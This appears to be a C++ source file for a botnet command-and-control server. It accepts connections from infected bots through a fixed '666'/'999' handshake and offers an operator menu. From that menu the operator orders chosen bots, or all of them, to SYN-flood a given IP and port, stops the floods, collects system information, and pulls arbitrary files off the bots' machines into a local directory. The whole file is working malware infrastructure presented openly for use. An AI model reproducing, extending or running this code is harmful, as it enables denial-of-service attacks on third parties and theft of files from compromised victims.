#include "BotnetServer.h"

#include <thread>
#include <limits.h>
#include <stdint.h>
#include <string.h>
#include <fstream>
#include <sys/stat.h>

#include "../defines.h"

using namespace botnet;

BotnetServer::BotnetServer(int port, int max_connections, bool verbose) : server(port, max_connections, verbose) 
{ }


void BotnetServer::Start() {
	try {
		if (!this->SetUpServer()) {
			// No need for thread safety if reached here
			std::cerr << "Server: Failed to set up server, aborting" << std::endl;
			return;
		}
	}
	catch (const std::exception& e) {
		// No need for thread safety if reached here
		std::cerr << "Server: Failed to set up server " << std::string(e.what()) << std::endl;
		return;
	}

	// Run sepperate thread to get connections
	std::thread get_connections(&BotnetServer::GetConnections, this);

	// On this thread, run the botnet CLI
	this->BotnetCLI();

	// Cleanup
	if (get_connections.joinable()) {
		get_connections.join();
	}

}

void BotnetServer::GetMessages() {

}

void BotnetServer::GetConnections() {
	// Make a socket set containing only the
	// lister to use its select function
	Socket_Set<tcpSocket> listener_set(Socket_Set<tcpSocket>::READ);
	listener_set.AddSocket(this->MainSocket);

	// deque containing only the listener,
	// returned by listener_set's Select function
	std::deque<tcpSocket> listener_queue;
	tcpSocket tmpSocket;

	// Continue serving until asked to shut down by user
	while (this->continue_serving) {
		try {
			// Wait for an incoming connection
			listener_queue = listener_set.Select(-1);
		}
		catch (const std::exception& e) {
			ThreadSafeLog(std::string(e.what()) + "\n", std::cerr);
			continue;
		}
		
		for (auto& socket : listener_queue) {
			// If socket is the listener, try to accept the new socket
			if (socket.isListening()) {
				try {
					// If succedded in accepting new socket, add to master set
					if (socket.Accept(tmpSocket)) {
						// Check if incoming connection is really a bot
						if (this->AuthenticateBot(tmpSocket)) {
							std::unique_lock<std::mutex> master_set_ul(master_set_lock);
							this->master_set.AddSocket(tmpSocket);
							master_set_ul.unlock();
							ThreadSafeLog("Connection received by socket " + tmpSocket.GetIp() + "\n");
						}
					}
				}
				catch (const std::exception& e) {
					ThreadSafeLog("Error on receiving incoming connection\n", std::cerr);
				}
			}
		}
	}
}

void BotnetServer::KeepAlive() {
	// Code 0 saved for keep-alive
	static const char   KEEP_ALIVE_CODE = static_cast<char>(Commands::KEEP_ALIVE);
	static const double TIMEOUT         = 3.0;
	
	std::string answer;

	for (const auto& socket : GetBotQueue()) {
		if (socket.isConnected()) {
			if (socket.Send(static_cast<const void*>(&KEEP_ALIVE_CODE), sizeof(char)) == sizeof(char)) {
				if (socket.Recv(answer, sizeof(char), TIMEOUT) && answer[0] == KEEP_ALIVE_CODE) {
					continue;
				}
			}

			this->RemoveBot(socket);
		}
	}
}

bool BotnetServer::AuthenticateBot(const tcpSocket& connection) {
	/* Authentication: Send the bot "666", expect to receive "999" in return */
	int try_cnt = 0;
	bool sent = false;

	// Try sending 3 times
	while (try_cnt < 3) {
		if (connection.Send("666") == -1) {
			try_cnt++;
		}
		else {
			sent = true;
			break;
		}
	}

	if (sent) {
		std::string answer;
		try_cnt = 0;

		// Try sending twice
		while (try_cnt < 2) {
			// Check for right answer
			if (connection.Recv(answer, 3, 2.5) == 3 && answer == "999") {
				return true;
			}
			try_cnt++;
		}
	}

	// If failed to send or receive a right answer
	return false;
}

std::string BotnetServer::GetCLIPrompt() const {
	std::string prompt;
	// Start count from 1, like "enum Commands"
	size_t command_cnt = 1;

	for (const std::string& command : this->GetCommandsList()) {
		prompt += std::to_string(command_cnt) + ": " + command + "\n";
		command_cnt++;
	}
	prompt += std::to_string(command_cnt) + ": Quit\n--> ";

	return prompt;
}

void BotnetServer::BotnetCLI() {
	std::string input;
	std::string command_output;
	int command = -1;

	// Quit command will always be the last command after all the commands.
	int quit_command = this->GetCommandsList().size() + 1;

	while (1) {
		ThreadSafeLogPrintAlways(this->GetCLIPrompt());
		
		input = ThreadSafeGetLine();

		try {
			command = std::stoi(input);
		}
		catch (const std::invalid_argument& e) {
			ThreadSafeLogPrintAlways("Please enter a valid number between 1 and " + std::to_string(quit_command) + "\n");
			continue;
		}
		catch (const std::exception& e) {
			ThreadSafeLogPrintAlways("Internal error. Please enter your choice again\n");
			continue;
		}
		if (command > quit_command || command < 1) {
			ThreadSafeLogPrintAlways("Please enter a valid number between 1 and " + std::to_string(quit_command) + "\n");
			continue;
		}
		if (command == quit_command) {
			this->continue_serving = false;
			break;
		}

		Commands command_given = static_cast<Commands>(command);
		try {
			// Execute the given command
			(this->*GetCommandFunction(command_given))();
		}
		catch (const std::exception& e) {
			ThreadSafeLog("Error on command: " + std::string(e.what()));
			continue;
		}

	}
}


/* Botnet commands void(void) functions */

void BotnetServer::PrintBots() {
	ThreadSafeLogPrintAlways("Bots:\n");

	for (const auto bot : GetBotQueue()) {
		// Only print if the bot is connected
		if (bot.isConnected()) {
			ThreadSafeLogPrintAlways(std::string("id: ") + std::to_string(bot.GetSockId()) + std::string(" IP: ") + bot.GetIp() + "\n");
		}
	}
	ThreadSafeLogPrintAlways("\n\n");
}

void BotnetServer::SYNFlood() {

	static const char syn_flood_code = static_cast<const char>(Commands::SYN_FLOOD);
	int bot_id = 0;
	
	std::string IP_to_flood;
	char        IP_to_send[INET_ADDRSTRLEN] = { 0 };
	uint16_t    port_to_flood               = 0;

	ThreadSafeLogPrintAlways("Enter bot id or '*' for all bots\n");
	bot_id = this->ReadID();

	ThreadSafeLogPrintAlways("Enter IP to flood:\n");
	IP_to_flood = this->ReadIP();
	strncpy(IP_to_send, IP_to_flood.c_str(), INET_ADDRSTRLEN);

	ThreadSafeLogPrintAlways("Enter port to flood:\n");
	port_to_flood = htons(this->ReadPort());

	// Send flood command to chosen connected bot, or all bots if bot_id == ALL_BOTS
	for (const tcpSocket& bot : GetBotQueue()) {
		if ((bot_id == ALL_BOTS || bot_id == bot.GetSockId()) && bot.isConnected()) {
			if (bot.Send(&syn_flood_code, sizeof(char)) == sizeof(char) &&
				bot.Send(IP_to_send, INET_ADDRSTRLEN) &&
				bot.Send(&port_to_flood, sizeof(port_to_flood)));
		}
	}
}


void BotnetServer::StopFlood() {

	static const char stop_flood_code = static_cast<const char>(Commands::STOP_FLOOD);
	int bot_id = 0;
	
	ThreadSafeLogPrintAlways("Enter bot id or '*' for all bots\n");
	bot_id = this->ReadID();

	// Send stop-flood command to chosen connected bot, or all bots if bot_id == ALL_BOTS
	for (const tcpSocket& bot : GetBotQueue()) {
		if ((bot_id == ALL_BOTS || bot_id == bot.GetSockId()) && bot.isConnected()) {
			bot.Send(&stop_flood_code, sizeof(char));
		}
	}
}


void BotnetServer::GetInfo() {

	char get_info_code = static_cast<char>(Commands::GET_INFO);
	int bot_id;
	std::string info;
	static const size_t MAX_INFO_SIZE = 512;

	ThreadSafeLogPrintAlways("Enter bot id or '*' for all bots\n");
	bot_id = this->ReadID();

	// Send get_info command to chosen connected bot, or all bots if bot_id == ALL_BOTS
	for (const tcpSocket& bot : GetBotQueue()) {
		if ((bot_id == ALL_BOTS || bot_id == bot.GetSockId()) && bot.isConnected()) {
			if (bot.Send(&get_info_code, sizeof(char)) == sizeof(char)) {
				int retv = bot.Recv(info, MAX_INFO_SIZE);
				// If connection closed, close and remove socket
				if (retv == 0) {
					RemoveBot(bot);
				}
				// If Recv succeded, print info, if not, skip it
				else if (retv > 0) {
					ThreadSafeLogPrintAlways("Bot " + std::to_string(bot.GetSockId()) + ":\n" + info + "\n");
				}
			}
		}
	}
	ThreadSafeLogPrintAlways("\n");
}

void BotnetServer::GetFile() {
	char get_file_code = static_cast<char>(Commands::GET_FILE);

	std::string file_path;
	int bot_id;
	char confirmation = 0;

	ThreadSafeLogPrintAlways("Enter bot id\n");
	bot_id = this->ReadNumber();

	ThreadSafeLogPrintAlways("Enter path to try to get:\n");
	file_path = ThreadSafeGetLine();
	
	for (const tcpSocket& bot : GetBotQueue()) {
		if (bot_id == bot.GetSockId() && bot.isConnected()) {
			if (bot.Send(&get_file_code, sizeof(char)) == sizeof(char) &&
				bot.Send(file_path) == static_cast<int>(file_path.length()))
			{

				int retv = bot.Recv(&confirmation, sizeof(char), 5);
				// If connection closed, close and remove socket
				if (retv == 0) {
					ThreadSafeLogPrintAlways("Bot Logged off\n");
					RemoveBot(bot);
				}


				else if (retv == sizeof(char)) {
					if (confirmation == 'Y') {
						this->GetFileFrom(bot, file_path);
						return;
					}
					else {
						ThreadSafeLogPrintAlways("File " + file_path + " does not exist\n");
						return;
					}
				}

				// On timeout or recv error
				else {
					ThreadSafeLogPrintAlways("Bot Not responsive\n");
					return;
				}
			}
		}
	}

	ThreadSafeLogPrintAlways("Bot " + std::to_string(bot_id) + " not found\n");
}

/* Botnet commands helpers */


void BotnetServer::GetFileFrom(const tcpSocket& bot, const std::string& file_path) {

	std::ofstream ofile;
	std::string new_file_path = this->GetNewFileName(file_path);

	mkdir(BOT_FILE_UPLOAD_DIR.c_str(), 0777);

	struct stat st = {0};

	if (stat(BOT_FILE_UPLOAD_DIR.c_str(), &st) == -1) {
		throw std::runtime_error("Error making directory " + BOT_FILE_UPLOAD_DIR + ": " + std::string(strerror(errno)));
	}

	ofile.open(new_file_path, std::ios::binary | std::ios::out | std::ios::trunc);
	if (ofile.bad()) {
		throw std::runtime_error("Error opening file " + new_file_path + ": " + std::string(strerror(errno)));
	}

	// Start receiving file from bot
	static const int    MAX_CHUNK = 5*1024; // 5kb at a time	
	static const double TIMEOUT   = 5;

	std::string file_content;
	uint32_t    left_to_read = 0;
	int         retv         = 0;

	retv = bot.Recv(&left_to_read, sizeof(left_to_read), TIMEOUT);

	if (retv == 0) {
		RemoveBot(bot);
		throw std::runtime_error("Bot disconnected..");
	}
	if (retv == -2) {
		throw std::runtime_error("Recv timed out, try again..");
	}
	if (retv != sizeof(left_to_read)) {
		throw std::runtime_error("Recv failed, try again..");
	}
	
	left_to_read = ntohl(left_to_read);

	while (left_to_read > 0) {
		retv = bot.Recv(file_content, MAX_CHUNK, TIMEOUT);
		if (retv == 0) {
			RemoveBot(bot);
			throw std::runtime_error("Bot disconnected..");
		}
		if (retv == -1) {
			throw std::runtime_error("Recv failed, try again..");
		}
		if (retv == -2) {
			throw std::runtime_error("Recv timed out, try again..");
		}
		ofile << file_content;
		left_to_read -= file_content.size();
	}
}

std::string BotnetServer::GetNewFileName(const std::string& file_path) {

	std::string file_name;
	std::string new_file_path;

	size_t last_dir = file_path.find_last_of("/\\");
	if (last_dir != std::string::npos) {
		file_name = file_path.substr(last_dir+1);
	}
	else {
		file_name = file_path;
	}

	if (access((BOT_FILE_UPLOAD_DIR + "/" + file_name).c_str(), F_OK) != 0) {
		new_file_path = BOT_FILE_UPLOAD_DIR + "/" + file_name;
	}
	else {
		for (int i = 0; i < 256; i++) {
			if (access((BOT_FILE_UPLOAD_DIR + "/" + file_name + "(" + std::to_string(i) + ")").c_str(), F_OK) != 0) {
				new_file_path = BOT_FILE_UPLOAD_DIR + "/" + file_name + "(" + std::to_string(i) + ")";
				break;
			}
		}
	}

	return new_file_path;
}

void BotnetServer::RemoveBot(const tcpSocket& bot_to_remove) {
	bot_to_remove.Close();
	std::lock_guard<std::mutex> master_set_lg(master_set_lock);
	this->master_set.RemoveSocket(bot_to_remove);
}

std::string BotnetServer::ReadIP() {
	std::string input;
	while (1) {
		input = ThreadSafeGetLine();

		if (!LegalIP(input)) {
			ThreadSafeLogPrintAlways("Enter legal IP address:\nXXX.XXX.XXX.XXX; 255 <= XXX >= 0\n");
		}
		else {
			break;
		}

	}
		return input;
}

bool BotnetServer::LegalIP(const std::string& IP_address) const {
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, IP_address.c_str(), &(sa.sin_addr));
    return (result != 0);
}

int BotnetServer::ReadID() {
	std::string input;
	int id;

	while (1) {
		input = ThreadSafeGetLine();

		if (input[0] == '*') {
			return ALL_BOTS;
		}
		else {
			try {
				id = std::stoi(input);
			}
			catch (const std::invalid_argument& e) {
				ThreadSafeLogPrintAlways("Please enter a valid number, or '*' for all bots\n");
				continue;
			}
			catch (const std::exception& e) {
				ThreadSafeLogPrintAlways("Internal error. Please enter your choice again\n");
				continue;
			}

			return id;
		}
	}
}

int BotnetServer::ReadNumber() {
	std::string input;
	int num;

	while (1) {
		input = ThreadSafeGetLine();

		try {
			num = std::stoi(input);
		}
		catch (const std::invalid_argument& e) {
			ThreadSafeLogPrintAlways("Please enter a valid number\n");
			continue;
		}
		catch (const std::exception& e) {
			ThreadSafeLogPrintAlways("Internal error. Please enter your choice again\n");
			continue;
		}

		return num;
	}
}

uint16_t BotnetServer::ReadPort() {
	std::string input;
	uint16_t port;
	static const uint16_t MAX_PORT = 65535;

	while (1) {
		input = ThreadSafeGetLine();

		try {
			port = std::stoi(input);
		}
		catch (const std::invalid_argument& e) {
			ThreadSafeLogPrintAlways("Please enter a valid number\n");
			continue;
		}
		catch (const std::exception& e) {
			ThreadSafeLogPrintAlways("Internal error. Please enter your choice again\n");
			continue;
		}
		if (port < 0 || port > MAX_PORT) {
			ThreadSafeLogPrintAlways("Enter a legal port between 0-" + std::to_string(MAX_PORT) + "\n");
			continue;
		}
		return port;
	}
}

std::deque<tcpSocket> BotnetServer::GetBotQueue() {
	std::lock_guard<std::mutex> master_set_lg(master_set_lock);
	return master_set.GetAllSockets();
}